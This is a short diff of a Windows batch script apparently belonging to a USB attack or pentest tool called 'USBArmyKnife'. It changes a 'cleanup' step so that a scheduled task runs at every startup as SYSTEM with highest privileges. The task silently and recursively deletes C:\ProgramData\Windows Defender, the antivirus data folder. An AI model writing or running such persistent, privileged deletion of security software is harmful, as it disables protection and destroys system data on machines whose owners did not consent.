@@ -109,7 +109,8 @@ if not exist "%DEST%" (
     echo    Folder deleted.
 ) else (
     echo    Folder locked by Windows Defender. Scheduling cleanup on next boot...
-    schtasks /create /tn "USBArmyKnife Cleanup" /tr "cmd.exe /c rmdir /s /q C:\ProgramData\Windows Defender" /sc onlogon /rl highest /f >nul 2>&1
+    schtasks /delete /tn "USBArmyKnife Cleanup" /f >nul 2>&1
+    schtasks /create /tn "USBArmyKnife Cleanup" /tr "cmd.exe /c rmdir /s /q C:\ProgramData\Windows Defender" /sc onstart /ru SYSTEM /rl highest /f >nul 2>&1
     echo    Cleanup scheduled. Folder will be removed after restart.
 )
 
